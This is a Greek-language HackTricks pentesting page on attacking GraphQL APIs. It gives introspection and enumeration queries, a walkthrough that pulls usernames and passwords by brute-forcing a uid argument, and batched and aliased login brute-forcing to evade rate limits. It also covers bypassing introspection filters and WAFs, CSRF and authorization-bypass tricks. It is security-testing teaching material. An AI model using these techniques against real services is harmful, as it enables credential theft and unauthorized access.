# GraphQL

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Εισαγωγή

Το GraphQL **επισημαίνεται** ως μια **αποτελεσματική εναλλακτική λύση** στο REST API, προσφέροντας μια απλοποιημένη προσέγγιση για την ανάκτηση δεδομένων από το backend. Σε αντίθεση με το REST, το οποίο συχνά απαιτεί πολλαπλά αιτήματα σε διάφορα σημεία ενδιαφέροντος για τη συλλογή δεδομένων, το GraphQL επιτρέπει την ανάκτηση όλων των απαιτούμενων πληροφοριών μέσω ενός **μόνο αιτήματος**. Αυτή η απλοποίηση ωφελεί σημαντικά τους προγραμματιστές μειώνοντας την πολυπλοκότητα των διαδικασιών ανάκτησης δεδομένων τους.

## GraphQL και Ασφάλεια

Με την εμφάνιση νέων τεχνολογιών, συμπεριλαμβανομένου του GraphQL, εμφανίζονται επίσης νέες ευπάθειες ασφαλείας. Ένα σημαντικό σημείο προς σημείωση είναι ότι το **GraphQL δεν περιλαμβάνει μηχανισμούς πιστοποίησης από προεπιλογή**. Είναι ευθύνη των προγραμματιστών να υλοποιήσουν τέτοια μέτρα ασφαλείας. Χωρίς κατάλληλη πιστοποίηση, τα σημεία τερματισμού του GraphQL μπορεί να αποκαλύψουν ευαίσθητες πληροφορίες σε μη πιστοποιημένους χρήστες, δημιουργώντας ένα σημαντικό κίνδυνο ασφάλειας.

### Επιθέσεις Διερεύνησης Καταλόγου και GraphQL

Για την εντοπισμό εκτεθειμένων περιπτώσεων GraphQL, συνιστάται η συμπερίληψη συγκεκριμένων διαδρομών σε επιθέσεις διερεύνησης καταλόγου. Αυτοί οι διαδρομοί είναι:

* `/graphql`
* `/graphiql`
* `/graphql.php`
* `/graphql/console`
* `/api`
* `/api/graphql`
* `/graphql/api`
* `/graphql/graphql`

Η εντοπισμός ανοιχτών περιπτώσεων GraphQL επιτρέπει την εξέταση των υποστηριζόμενων ερωτημάτων. Αυτό είναι κρίσιμο για την κατανόηση των δεδομένων προσβάσιμων μέσω του σημείου τερματισμού. Το σύστημα εσωτροσκόπησης του GraphQL διευκολύνει αυτό με τη λεπτομερή περιγραφή των ερωτημάτων που υποστηρίζει ένα σχήμα. Για περισσότερες πληροφορίες επί του θέματος, ανατρέξτε στην τεκμηρίωση του GraphQL για την εσωτροσκόπηση: [**GraphQL: Γλώσσα ερωτημάτων για APIs.**](https://graphql.org/learn/introspection/)

### Αναγνώριση

Το εργαλείο [**graphw00f**](https://github.com/dolevf/graphw00f) είναι ικανό να ανιχνεύσει ποια μηχανή GraphQL χρησιμοποιείται σε έναν διακομιστή και στη συνέχεια εκτυπώνει μερικές χρήσιμες πληροφορίες για τον ελεγκτή ασφαλείας.

#### Παγκόσμια ερωτήματα <a href="#universal-queries" id="universal-queries"></a>

Για να ελέγξετε αν μια διεύθυνση URL είναι ένα υπηρεσία GraphQL, μπορεί να σταλεί ένα **παγκόσμιο ερώτημα**, `query{__typename}`. Αν η απάντηση περιλαμβάνει `{"data": {"__typename": "Query"}}`, επιβεβαιώνει ότι η διεύθυνση URL φιλοξενεί ένα σημείο τερματισμού GraphQL. Αυτή η μέθοδος βασίζεται στο πεδίο `__typename` του GraphQL, το οποίο αποκαλύπτει τον τύπο του αντικειμένου που ερωτήθηκε.
```javascript
query{__typename}
```
### Βασική Απαρίθμηση

Το Graphql συνήθως υποστηρίζει **GET**, **POST** (x-www-form-urlencoded) και **POST**(json). Ωστόσο, για λόγους ασφαλείας συνιστάται να επιτρέπεται μόνο το json για να αποτραπούν οι επιθέσεις CSRF.

#### Εσωστρέφεια

Για να χρησιμοποιήσετε την εσωστρέφεια για να ανακαλύψετε πληροφορίες σχήματος, ερευνήστε το πεδίο `__schema`. Αυτό το πεδίο είναι διαθέσιμο στον ριζικό τύπο όλων των ερωτημάτων.
```bash
query={__schema{types{name,fields{name}}}}
```
Με αυτό το ερώτημα θα βρείτε το όνομα όλων των τύπων που χρησιμοποιούνται:

![](<../../.gitbook/assets/image (1036).png>)

{% code overflow="wrap" %}
```bash
query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}
```
{% endcode %}

Με αυτό το ερώτημα μπορείτε να εξάγετε όλους τους τύπους, τα πεδία τους και τα ορίσματά τους (και τον τύπο των ορισμάτων). Αυτό θα είναι πολύ χρήσιμο για να ξέρετε πώς να ερωτήσετε τη βάση δεδομένων.

![](<../../.gitbook/assets/image (950).png>)

**Σφάλματα**

Είναι ενδιαφέρον να γνωρίζουμε αν τα **σφάλματα** θα εμφανίζονται καθώς θα συμβάλουν με χρήσιμες **πληροφορίες**.
```
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```
![](<../../.gitbook/assets/image (416).png>)

**Απαρίθμηση Σχήματος Βάσης Δεδομένων μέσω Εσωστρέφειας**

{% hint style="info" %}
Εάν η εσωστρέφεια είναι ενεργοποιημένη αλλά η παραπάνω ερώτηση δεν εκτελείται, δοκιμάστε να αφαιρέσετε τις οδηγίες `onOperation`, `onFragment` και `onField` από τη δομή της ερώτησης.
{% endhint %}
```bash
#Full introspection query

query IntrospectionQuery {
__schema {
queryType {
name
}
mutationType {
name
}
subscriptionType {
name
}
types {
...FullType
}
directives {
name
description
args {
...InputValue
}
onOperation  #Often needs to be deleted to run query
onFragment   #Often needs to be deleted to run query
onField      #Often needs to be deleted to run query
}
}
}

fragment FullType on __Type {
kind
name
description
fields(includeDeprecated: true) {
name
description
args {
...InputValue
}
type {
...TypeRef
}
isDeprecated
deprecationReason
}
inputFields {
...InputValue
}
interfaces {
...TypeRef
}
enumValues(includeDeprecated: true) {
name
description
isDeprecated
deprecationReason
}
possibleTypes {
...TypeRef
}
}

fragment InputValue on __InputValue {
name
description
type {
...TypeRef
}
defaultValue
}

fragment TypeRef on __Type {
kind
name
ofType {
kind
name
ofType {
kind
name
ofType {
kind
name
}
}
}
}
```
Ερώτημα ενσωματωμένης επιθεώρησης:
```
/?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}
```
Η τελευταία γραμμή κώδικα είναι ένα ερώτημα graphql που θα αδειάσει όλες τις μετα-πληροφορίες από το graphql (ονόματα αντικειμένων, παραμέτρους, τύπους...)

![](<../../.gitbook/assets/image (363).png>)

Εάν η εσωστρέφεια είναι ενεργοποιημένη, μπορείτε να χρησιμοποιήσετε το [**GraphQL Voyager**](https://github.com/APIs-guru/graphql-voyager) για να δείτε σε μια γραφική διεπαφή όλες τις επιλογές.

### Ερωτήματα

Τώρα που γνωρίζουμε ποιο είδος πληροφοριών αποθηκεύεται μέσα στη βάση δεδομένων, ας προσπαθήσουμε να **εξάγουμε μερικές τιμές**.

Στην εσωστρέφεια μπορείτε να βρείτε **ποιο αντικείμενο μπορείτε να ερωτήσετε απευθείας** (επειδή δεν μπορείτε να ερωτήσετε ένα αντικείμενο απλώς επειδή υπάρχει). Στην παρακάτω εικόνα μπορείτε να δείτε ότι το "_queryType_" ονομάζεται "_Query_" και ότι ένα από τα πεδία του αντικειμένου "_Query_" είναι το "_flags_", το οποίο είναι επίσης ένας τύπος αντικειμένου. Συνεπώς, μπορείτε να ερωτήσετε το αντικείμενο σημαία.

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-17-48.png>)

Σημειώστε ότι ο τύπος του ερωτήματος "_flags_" είναι "_Flags_", και αυτό το αντικείμενο ορίζεται ως εξής:

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-22-57 (1).png>)

Μπορείτε να δείτε ότι τα αντικείμενα "_Flags_" αποτελούνται από **όνομα** και **τιμή**. Έπειτα μπορείτε να πάρετε όλα τα ονόματα και τις τιμές των σημαιών με το ερώτημα:
```javascript
query={flags{name, value}}
```
Σημειώστε ότι σε περίπτωση που το **αντικείμενο προς ερώτηση** είναι ένα **πρωτογενές** **τύπος** όπως **συμβολοσειρά** όπως στο παρακάτω παράδειγμα

![](<../../.gitbook/assets/image (958).png>)

Μπορείτε απλά να το ερωτήσετε με:
```javascript
query={hiddenFlags}
```
Σε ένα άλλο παράδειγμα όπου υπήρχαν 2 αντικείμενα μέσα στο αντικείμενο τύπου "_Query_": "_user_" και "_users_".\
Αν αυτά τα αντικείμενα δεν χρειάζονται κάποιο όρισμα για αναζήτηση, θα μπορούσατε **να ανακτήσετε όλες τις πληροφορίες από αυτά** απλά **ζητώντας** τα δεδομένα που θέλετε. Σε αυτό το παράδειγμα από το Internet μπορείτε να εξάγετε τα αποθηκευμένα ονόματα χρηστών και κωδικούς πρόσβασης.

Ωστόσο, σε αυτό το παράδειγμα, αν προσπαθήσετε να το κάνετε, λαμβάνετε αυτό το **σφάλμα**:

Φαίνεται ότι κάπως θα αναζητήσει χρησιμοποιώντας το όρισμα "_**uid**_" τύπου _**Int**_.\
Πάντως, ήδη γνωρίζαμε ότι, στην ενότητα [Βασική Απαρίθμηση](graphql.md#basic-enumeration) προτάθηκε μια ερώτηση που μας έδειχνε όλες τις απαραίτητες πληροφορίες: `query={__schema{types{name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}}}`

Αν διαβάσετε την παρεχόμενη εικόνα όταν εκτελέσω αυτήν την ερώτηση, θα δείτε ότι το "_**user**_" είχε το **arg** "_**uid**_" τύπου _Int_.

Έτσι, κάνοντας μια ελαφριά επίθεση _**uid**_ bruteforce, ανακάλυψα ότι στο _**uid**=**1**_ ανακτήθηκε ένα όνομα χρήστη και ένας κωδικός πρόσβασης:\
`query={user(uid:1){user,password}}`

Σημειώστε ότι **ανακάλυψα** ότι μπορούσα να ζητήσω τις **παραμέτρους** "_**user**_" και "_**password**_" επειδή αν προσπαθήσω να αναζητήσω κάτι που δεν υπάρχει (`query={user(uid:1){noExists}}`) λαμβάνω αυτό το σφάλμα:

Κατά τη διάρκεια της φάσης **απαρίθμησης** ανακάλυψα ότι το αντικείμενο "_**dbuser**_" είχε ως πεδία "_**user**_" και "_**password**_.

**Κόλπος απορρόφησης συμβολοσειράς ερωτήματος (ευχαριστίες στον @BinaryShadow\_)**

Αν μπορείτε να αναζητήσετε με βάση τον τύπο συμβολοσειράς, όπως: `query={theusers(description: ""){username,password}}` και **αναζητήσετε ένα κενό συμβολοσειράς** θα **απορροφήσει όλα τα δεδομένα**. (_Σημείωση ότι αυτό το παράδειγμα δεν σχετίζεται με το παράδειγμα των οδηγιών, για αυτό το παράδειγμα υποθέστε ότι μπορείτε να αναζητήσετε χρησιμοποιώντας τον "**theusers**" με ένα πεδίο Συμβολοσειράς που ονομάζεται "**description**"_).

### Αναζήτηση

Σε αυτή τη διάταξη, μια **βάση δεδομένων** περιέχει **άτομα** και **ταινίες**. Τα **άτομα** αναγνωρίζονται με το **email** και το **όνομά** τους· οι **ταινίες** με το **όνομά** και τη **βαθμολογία** τους. Τα **άτομα** μπορούν να είναι φίλοι μεταξύ τους και επίσης να έχουν ταινίες, υποδηλώνοντας σχέσεις μέσα στη βάση δεδομένων.

Μπορείτε να **αναζητήσετε** άτομα **με βάση** το **όνομά** τους και να λάβετε τα emails τους:
```javascript
{
searchPerson(name: "John Doe") {
email
}
}
```
Μπορείτε **να αναζητήσετε** πρόσωπα **με βάση το όνομά τους** και να λάβετε τις **ταινίες στις οποίες έχουν εγγραφεί**:
```javascript
{
searchPerson(name: "John Doe") {
email
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
Σημειώστε πώς υποδεικνύεται η ανάκτηση του `name` των `subscribedMovies` του ατόμου.

Μπορείτε επίσης **να αναζητήσετε πολλά αντικείμενα ταυτόχρονα**. Σε αυτήν την περίπτωση, γίνεται αναζήτηση 2 ταινιών:
```javascript
{
searchPerson(subscribedMovies: [{name: "Inception"}, {name: "Rocky"}]) {
name
}
}r
```
Ή ακόμα και **σχέσεις πολλαπλών διαφορετικών αντικειμένων χρησιμοποιώντας ψευδώνυμα**:
```javascript
{
johnsMovieList: searchPerson(name: "John Doe") {
subscribedMovies {
edges {
node {
name
}
}
}
}
davidsMovieList: searchPerson(name: "David Smith") {
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
### Μεταλλάξεις

**Οι μεταλλάξεις χρησιμοποιούνται για να γίνουν αλλαγές στην πλευρά του διακομιστή.**

Στο **introspection** μπορείτε να βρείτε τις **δηλωμένες** **μεταλλάξεις**. Στην παρακάτω εικόνα, το "_MutationType_" ονομάζεται "_Mutation_" και το αντικείμενο "_Mutation_" περιέχει τα ονόματα των μεταλλάξεων (όπως "_addPerson_" σε αυτήν την περίπτωση):

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-26-27 (1).png>)

Σε αυτήν τη διάταξη, μια **βάση δεδομένων** περιέχει **άτομα** και **ταινίες**. Τα **άτομα** αναγνωρίζονται με το **email** και το **όνομά** τους· οι **ταινίες** με το **όνομά** και τη **βαθμολογία** τους. Τα **άτομα** μπορούν να είναι φίλοι μεταξύ τους και επίσης να έχουν ταινίες, υποδηλώνοντας σχέσεις μέσα στη βάση δεδομένων.

Μια μετάλλαξη για τη **δημιουργία νέων** ταινιών μέσα στη βάση δεδομένων μπορεί να είναι όπως η παρακάτω (σε αυτό το παράδειγμα η μετάλλαξη ονομάζεται `addMovie`):
```javascript
mutation {
addMovie(name: "Jumanji: The Next Level", rating: "6.8/10", releaseYear: 2019) {
movies {
name
rating
}
}
}
```
**Σημειώστε πώς και οι τιμές και ο τύπος των δεδομένων υποδεικνύονται στο ερώτημα.**

Επιπλέον, η βάση δεδομένων υποστηρίζει μια λειτουργία **μετάλλαξης**, με το όνομα `addPerson`, η οποία επιτρέπει τη δημιουργία **προσώπων** μαζί με τις συσχετίσεις τους με υπάρχοντες **φίλους** και **ταινίες**. Είναι κρίσιμο να σημειωθεί ότι οι φίλοι και οι ταινίες πρέπει να υπάρχουν προηγουμένως στη βάση δεδομένων πριν συνδεθούν με το νεοδημιουργημένο άτομο.
```javascript
mutation {
addPerson(name: "James Yoe", email: "jy@example.com", friends: [{name: "John Doe"}, {email: "jd@example.com"}], subscribedMovies: [{name: "Rocky"}, {name: "Interstellar"}, {name: "Harry Potter and the Sorcerer's Stone"}]) {
person {
name
email
friends {
edges {
node {
name
email
}
}
}
subscribedMovies {
edges {
node {
name
rating
releaseYear
}
}
}
}
}
}
```
### Υπερφόρτωση Οδηγιών

Όπως εξηγείται σε [**ένα από τα ευπάθειες που περιγράφονται σε αυτήν την αναφορά**](https://www.landh.tech/blog/20240304-google-hack-50000/), η υπερφόρτωση μιας οδηγίας σημαίνει την κλήση μιας οδηγίας ακόμα και εκατομμύρια φορές για να κάνει τον διακομιστή να σπαταλήσει λειτουργίες μέχρι να είναι δυνατόν να γίνει DoS.

### Συγχρονισμός επίθεσης βίας σε 1 αίτημα API

Αυτές οι πληροφορίες προέρχονται από το [https://lab.wallarm.com/graphql-batching-attack/](https://lab.wallarm.com/graphql-batching-attack/).\
Πιστοποίηση μέσω του GraphQL API με **ταυτόχρονη αποστολή πολλών ερωτήσεων με διαφορετικές διαπιστευτήρια** για έλεγχο. Είναι μια κλασική επίθεση βίας, αλλά τώρα είναι δυνατό να σταλούν περισσότερα από ένα ζεύγη σύνδεσης/κωδικού πρόσβασης ανά αίτημα HTTP λόγω της δυνατότητας συγχρονισμού του GraphQL. Αυτή η προσέγγιση θα παραπλανήσει εφαρμογές εξωτερικής παρακολούθησης ρυθμού να νομίζουν ότι όλα είναι καλά και ότι δεν υπάρχει bot που προσπαθεί να μαντέψει κωδικούς πρόσβασης.

Παρακάτω μπορείτε να βρείτε την απλούστερη επίδειξη ενός αιτήματος πιστοποίησης εφαρμογής, με **3 διαφορετικά ζεύγη email/κωδικών πρόσβασης ταυτόχρονα**. Φυσικά είναι δυνατό να σταλούν χιλιάδες σε ένα μόνο αίτημα με τον ίδιο τρόπο:

![](<../../.gitbook/assets/image (1081).png>)

Όπως βλέπουμε από το στιγμιότυπο απόκρισης, τα πρώτο και τρίτο αιτήματα επέστρεψαν _null_ και αντανακλούν τις αντίστοιχες πληροφορίες στην ενότητα _σφάλματος_. Η **δεύτερη μετάλλαξη είχε τα σωστά στοιχεία πιστοποίησης** και η απόκριση είχε το σωστό τεκμήριο συνεδρίας πιστοποίησης.

![](<../../.gitbook/assets/image (119) (1).png>)

## GraphQL Χωρίς Εισαγωγή

Όλο και περισσότερα **σημεία πρόσβασης του graphql απενεργοποιούν την εισαγωγή**. Ωστόσο, τα σφάλματα που εκτοξεύει το graphql όταν λαμβάνει ένα αναπάντεχο αίτημα είναι αρκετά για εργαλεία όπως το [**clairvoyance**](https://github.com/nikitastupin/clairvoyance) να ανακτήσουν το μεγαλύτερο μέρος του σχήματος.

Επιπλέον, η επέκταση του Burp Suite [**GraphQuail**](https://github.com/forcesunseen/graphquail) **παρατηρεί τα αιτήματα GraphQL API που περνούν μέσω του Burp** και **δημιουργεί** ένα εσωτερικό GraphQL **σχήμα** με κάθε νέα ερώτηση που βλέπει. Μπορεί επίσης να αποκαλύψει το σχήμα για το GraphiQL και το Voyager. Η επέκταση επιστρέφει μια ψεύτικη απόκριση όταν λαμβάνει ένα αίτημα εισαγωγής. Ως αποτέλεσμα, το GraphQuail εμφανίζει όλες τις ερωτήσεις, τα ορίσματα και τα πεδία που είναι διαθέσιμα για χρήση μέσα στο API. Για περισσότερες πληροφορίες [**ελέγξτε αυτό**](https://blog.forcesunseen.com/graphql-security-testing-without-a-schema).

Μια ωραία **λίστα λέξεων** για ανακάλυψη [**οντοτήτων GraphQL μπορεί να βρεθεί εδώ**](https://github.com/Escape-Technologies/graphql-wordlist?).

### Παράκαμψη άμυνας εισαγωγής GraphQL <a href="#bypassing-graphql-introspection-defences" id="bypassing-graphql-introspection-defences"></a>

Για να παρακάμψετε τους περιορισμούς στα αιτήματα εισαγωγής σε APIs, η εισαγωγή ενός **ειδικού χαρακτήρα μετά τη λέξη-κλειδί `__schema`** αποδεικνύεται αποτελεσματική. Αυτή η μέθοδος εκμεταλλεύεται συνηθισμένες παραβιάσεις προγραμματιστών σε μοτίβα regex που στοχεύουν στο να μπλοκάρουν την εισαγωγή εστιάζοντας στη λέξη-κλειδί `__schema`. Προσθέτοντας χαρακτήρες όπως **κενά, νέες γραμμές και κόμματα**, τα οποία το GraphQL αγνοεί αλλά ενδέχεται να μην λαμβάνονται υπόψη στα regex, μπορούν να παρακαμφθούν οι περιορισμοί. Για παράδειγμα, ένα αίτημα εισαγωγής με μια νέα γραμμή μετά το `__schema` μπορεί να παρακάμψει τέτοιες άμυνες:
```bash
# Example with newline to bypass
{
"query": "query{__schema
{queryType{name}}}"
}
```
Αν αντιμετωπίζετε ανεπιτυχία, εξετάστε εναλλακτικές μεθόδους αιτήσεων, όπως **αιτήσεις GET** ή **POST με `x-www-form-urlencoded`**, καθώς οι περιορισμοί μπορεί να ισχύουν μόνο για αιτήσεις POST.

### Δοκιμάστε τα WebSockets

Όπως αναφέρεται σε [**αυτή την ομιλία**](https://www.youtube.com/watch?v=tIo\_t5uUK50), ελέγξτε αν είναι δυνατή η σύνδεση στο graphQL μέσω WebSockets, καθώς αυτό ενδέχεται να σας επιτρέψει να παρακάμψετε ένα πιθανό WAF και να κάνετε την επικοινωνία websocket να διαρρεύσει το σχήμα του graphQL:
```javascript
ws = new WebSocket('wss://target/graphql', 'graphql-ws');
ws.onopen = function start(event) {
var GQL_CALL = {
extensions: {},
query: `
{
__schema {
_types {
name
}
}
}`
}

var graphqlMsg = {
type: 'GQL.START',
id: '1',
payload: GQL_CALL,
};
ws.send(JSON.stringify(graphqlMsg));
}
```
### **Ανακάλυψη Εκθεσμένων Δομών GraphQL**

Όταν η εσωστρέφεια είναι απενεργοποιημένη, η εξέταση του πηγαίου κώδικα της ιστοσελίδας για προφορτωμένες ερωτήσεις σε βιβλιοθήκες JavaScript είναι μια χρήσιμη στρατηγική. Αυτές οι ερωτήσεις μπορούν να βρεθούν χρησιμοποιώντας την καρτέλα `Sources` στα εργαλεία προγραμματιστή, παρέχοντας εισαγωγές στο σχήμα του API και αποκαλύπτοντας πιθανώς **ευαίσθητες εκθεσμένες ερωτήσεις**. Οι εντολές για αναζήτηση μέσα στα εργαλεία προγραμματιστή είναι:
```javascript
Inspect/Sources/"Search all files"
file:* mutation
file:* query
```
## CSRF στο GraphQL

Αν δεν ξέρετε τι είναι το CSRF, διαβάστε την ακόλουθη σελίδα:

{% content-ref url="../../pentesting-web/csrf-cross-site-request-forgery.md" %}
[csrf-cross-site-request-forgery.md](../../pentesting-web/csrf-cross-site-request-forgery.md)
{% endcontent-ref %}

Εκεί θα μπορέσετε να βρείτε αρκετά σημεία πρόσβασης GraphQL **που έχουν διαμορφωθεί χωρίς τα CSRF τokens.**

Σημειώστε ότι οι αιτήσεις GraphQL συνήθως στέλνονται μέσω αιτήσεων POST χρησιμοποιώντας το Content-Type **`application/json`**.
```javascript
{"operationName":null,"variables":{},"query":"{\n  user {\n    firstName\n    __typename\n  }\n}\n"}
```
Ωστόσο, οι περισσότεροι τερματικοί GraphQL υποστηρίζουν επίσης **`form-urlencoded` POST αιτήσεις:**
```javascript
query=%7B%0A++user+%7B%0A++++firstName%0A++++__typename%0A++%7D%0A%7D%0A
```
Επομένως, καθώς οι αιτήσεις CSRF όπως οι προηγούμενες στέλνονται **χωρίς προεπισκόπηση αιτήσεων**, είναι δυνατόν να **πραγματοποιηθούν** **αλλαγές** στο GraphQL καταχρώντας το CSRF.

Ωστόσο, σημειώστε ότι η νέα προεπιλεγμένη τιμή του cookie με τη σημαία `samesite` του Chrome είναι `Lax`. Αυτό σημαίνει ότι το cookie θα σταλεί μόνο από μια τρίτη ιστοσελίδα σε αιτήσεις GET.

Σημειώστε επίσης ότι συνήθως είναι δυνατόν να στείλετε την **αίτηση** **ερώτησης** επίσης ως **GET** **αιτήση και το CSRF token ενδέχεται να μην ελεγχθεί σε μια GET αίτηση.**

Επίσης, καταχρώντας μια [**XS-Search**](../../pentesting-web/xs-search/) **επίθεση** ενδέχεται να εξαγάγετε περιεχόμενο από το σημείο GraphQL καταχρώντας τα διαπιστευτήρια του χρήστη.

Για περισσότερες πληροφορίες **ελέγξτε τη** [**αρχική ανάρτηση εδώ**](https://blog.doyensec.com/2021/05/20/graphql-csrf.html).

## Απάτη Cross-site WebSocket στο GraphQL

Παρόμοια με τις ευπάθειες CRSF κατά του GraphQL, είναι επίσης δυνατόν να πραγματοποιηθεί μια **απάτη Cross-site WebSocket για να καταχραστείτε μια ταυτοποίηση με το GraphQL με μη προστατευμένα cookies** και να κάνετε έναν χρήστη να πραγματοποιήσει απροσδόκητες ενέργειες στο GraphQL.

Για περισσότερες πληροφορίες ελέγξτε:

{% content-ref url="../../pentesting-web/websocket-attacks.md" %}
[websocket-attacks.md](../../pentesting-web/websocket-attacks.md)
{% endcontent-ref %}

## Εξουσιοδότηση στο GraphQL

Πολλές λειτουργίες GraphQL που έχουν οριστεί στο σημείο πρόσβασης ενδέχεται να ελέγχουν μόνο την ταυτοποίηση του αιτούντος αλλά όχι την εξουσιοδότηση.

Η τροποποίηση των μεταβλητών εισόδου της ερώτησης θα μπορούσε να οδηγήσει σε ευαίσθητες λεπτομέρειες λογαριασμού [διαρροή](https://hackerone.com/reports/792927).

Η μετάλλαξη θα μπορούσε ακόμη να οδηγήσει σε ανάληψη λογαριασμού προσπαθώντας να τροποποιήσει άλλα δεδομένα λογαριασμού.
```javascript
{
"operationName":"updateProfile",
"variables":{"username":INJECT,"data":INJECT},
"query":"mutation updateProfile($username: String!,...){updateProfile(username: $username,...){...}}"
}
```
### Παράκαμψη της εξουσιοδότησης στο GraphQL

Η [σύνδεση ερωτημάτων](https://s1n1st3r.gitbook.io/theb10g/graphql-query-authentication-bypass-vuln) μπορεί να παρακάμψει ένα αδύναμο σύστημα πιστοποίησης.

Στο παρακάτω παράδειγμα μπορείτε να δείτε ότι η λειτουργία είναι "forgotPassword" και ότι θα πρέπει να εκτελέσει μόνο το ερώτημα forgotPassword που της αντιστοιχεί. Αυτό μπορεί να παρακαμφθεί προσθέτοντας ένα ερώτημα στο τέλος, σε αυτήν την περίπτωση προσθέτουμε το "register" και μια μεταβλητή χρήστη για το σύστημα να εγγραφεί ως νέος χρήστης.

<figure><img src="../../.gitbook/assets/GraphQLAuthBypassMethod.PNG" alt=""><figcaption></figcaption></figure>

## Παράκαμψη Ορίων Ρυθμού Χρήσης Χρησιμοποιώντας Ψευδώνυμα στο GraphQL

Στο GraphQL, τα Ϩευδώνυμα είναι μια ισχυρή λειτουργία που επιτρέπει τη **ονομασία των ιδιοτήτων με σαφήνεια** κατά την αποστολή ενός αιτήματος API. Αυτή η δυνατότητα είναι ιδιαίτερα χρήσιμη για την ανάκτηση **πολλαπλών περιπτώσεων του ίδιου τύπου** αντικειμένου μέσα σε ένα μόνο αίτημα. Τα ψευδώνυμα μπορούν να χρησιμοποιηθούν για να ξεπεραστεί η περιοριστική διάταξη που εμποδίζει τα αντικείμενα GraphQL να έχουν πολλαπλές ιδιότητες με το ίδιο όνομα.

Για μια λεπτομερή κατανόηση των ψευδωνύμων στο GraphQL, συνιστάται η παρακολούθηση του παρακάτω πόρου: [Ψευδώνυμα](https://portswigger.net/web-security/graphql/what-is-graphql#aliases).

Ενώ ο κύριος σκοπός των ψευδωνύμων είναι να μειώσει την ανάγκη για πολλαπλές κλήσεις API, έχει εντοπιστεί ένα μη προσδιορισμένο περιστατικό όπου τα ψευδώνυμα μπορούν να χρησιμοποιηθούν για να εκτελέσουν επιθέσεις βίας στο GraphQL endpoint. Αυτό είναι δυνατό επειδή μερικά σημεία έχουν προστασία από ρυθμιστές ρυθμού σχεδιασμένους για να αποτρέψουν επιθέσεις βίας περιορίζοντας τον **αριθμό των αιτημάτων HTTP**. Ωστόσο, αυτοί οι ρυθμιστές ρυθμού ενδέχεται να μην λαμβάνουν υπόψη τον αριθμό των λειτουργιών μέσα σε κάθε αίτημα. Δεδομένου ότι τα ψευδώνυμα επιτρέπουν τη συμπερίληψη πολλαπλών ερωτημάτων σε ένα μόνο αίτημα HTTP, μπορούν να παρακάμψουν τέτοια μέτρα περιορισμού του ρυθμού.

